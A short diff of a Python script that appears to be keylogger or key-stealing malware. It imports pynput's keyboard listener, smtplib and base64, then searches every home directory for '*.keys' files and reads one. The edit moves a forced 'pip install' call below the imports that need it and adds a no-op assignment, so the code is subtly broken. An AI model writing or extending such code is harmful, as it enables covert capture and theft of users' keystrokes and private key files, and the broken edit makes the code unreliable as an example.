@@ -1,14 +1,15 @@
 import os
-os.system('pip install pynput && pip install logging')
-
 from pynput.keyboard import Key, Listener
 import logging
 import glob
 import smtplib
 import base64
+os.system('pip install pynput && pip install logging')
 
 for filename in glob.iglob('/home/**/*.keys', recursive=True):
     print(filename)
+
+filename = filename
 
 fo = open(filename, "rb")
 filecontent = fo.read()
